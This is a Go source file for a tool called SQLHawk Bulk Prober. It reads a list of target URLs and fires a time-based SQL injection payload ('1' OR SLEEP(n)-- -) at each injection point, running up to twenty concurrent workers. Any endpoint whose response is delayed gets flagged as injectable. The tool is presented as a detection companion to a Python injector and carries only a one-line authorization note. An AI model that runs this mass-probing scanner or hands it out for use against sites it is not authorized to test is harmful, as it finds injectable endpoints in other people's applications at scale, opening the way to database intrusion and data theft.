// SQLHawk Bulk Prober (Go)
// ========================
// A companion tool to the Python crawler/injector, written in Go to take
// advantage of real OS-thread concurrency for testing MANY parameters at
// once - useful once you already have a list of candidate injection
// points (e.g. exported from a bigger crawl, or a list of endpoints
// collected from a proxy log) and want to quickly re-confirm which ones
// are actually time-based SQL injectable, across dozens/hundreds of URLs
// in parallel.
//
// This only performs the same kind of detection the Python injector does
// (a SLEEP()-style timing check) - it does not exploit or extract data.
//
// Input file format: one URL per line, with the literal placeholder
// "FUZZ" where the injectable parameter value goes, e.g.:
//
//   http://target.example/search?id=FUZZ
//   http://target.example/profile?user=FUZZ&tab=1
//
// Build:
//   go build -o bulkprobe bulkprobe.go
//
// Usage:
//   ./bulkprobe -file targets.txt -delay 5 -concurrency 20
//
// Legal note: only ever point this at targets you are authorized to test.

package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const baselineValue = "1"

func timeBasedPayload(delaySeconds int) string {
	return fmt.Sprintf("1' OR SLEEP(%d)-- -", delaySeconds)
}

func probe(client *http.Client, target string, delaySeconds int) (vulnerable bool, elapsed time.Duration, err error) {
	payload := timeBasedPayload(delaySeconds)
	testURL := strings.Replace(target, "FUZZ", url.QueryEscape(payload), 1)

	start := time.Now()
	resp, err := client.Get(testURL)
	elapsed = time.Since(start)
	if err != nil {
		return false, elapsed, err
	}
	defer resp.Body.Close()

	vulnerable = elapsed.Seconds() >= float64(delaySeconds)-1.0
	return vulnerable, elapsed, nil
}

func worker(id int, jobs <-chan string, results chan<- string, delaySeconds int, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{Timeout: time.Duration(delaySeconds+10) * time.Second}

	for target := range jobs {
		vulnerable, elapsed, err := probe(client, target, delaySeconds)
		if err != nil {
			results <- fmt.Sprintf("[error] %s -> %v", target, err)
			continue
		}
		if vulnerable {
			results <- fmt.Sprintf("[VULNERABLE - time-based] %s (delayed %.1fs)", target, elapsed.Seconds())
		} else {
			results <- fmt.Sprintf("[ok] %s (%.2fs)", target, elapsed.Seconds())
		}
	}
}

func main() {
	filePath := flag.String("file", "", "Path to a text file with one target URL per line (use FUZZ as the injection placeholder)")
	delaySeconds := flag.Int("delay", 5, "Seconds to use for the SLEEP()-based timing payload")
	concurrency := flag.Int("concurrency", 20, "Number of concurrent workers")
	flag.Parse()

	if *filePath == "" {
		fmt.Println("Usage: bulkprobe -file targets.txt [-delay 5] [-concurrency 20]")
		os.Exit(1)
	}

	f, err := os.Open(*filePath)
	if err != nil {
		fmt.Printf("Could not open %s: %v\n", *filePath, err)
		os.Exit(1)
	}
	defer f.Close()

	var targets []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.Contains(line, "FUZZ") {
			fmt.Printf("[skip] no FUZZ placeholder: %s\n", line)
			continue
		}
		targets = append(targets, line)
	}

	if len(targets) == 0 {
		fmt.Println("No valid targets found (each line needs a FUZZ placeholder).")
		os.Exit(1)
	}

	fmt.Printf("Probing %d target(s) with %d worker(s), %ds delay payloads...\n\n",
		len(targets), *concurrency, *delaySeconds)

	jobs := make(chan string, len(targets))
	results := make(chan string, len(targets))
	var wg sync.WaitGroup

	for w := 1; w <= *concurrency; w++ {
		wg.Add(1)
		go worker(w, jobs, results, *delaySeconds, &wg)
	}

	for _, t := range targets {
		jobs <- t
	}
	close(jobs)

	go func() {
		wg.Wait()
		close(results)
	}()

	vulnerableCount := 0
	for r := range results {
		fmt.Println(r)
		if strings.Contains(r, "VULNERABLE") {
			vulnerableCount++
		}
	}

	fmt.Printf("\nDone. %d/%d target(s) flagged as time-based SQL injectable.\n",
		vulnerableCount, len(targets))
}
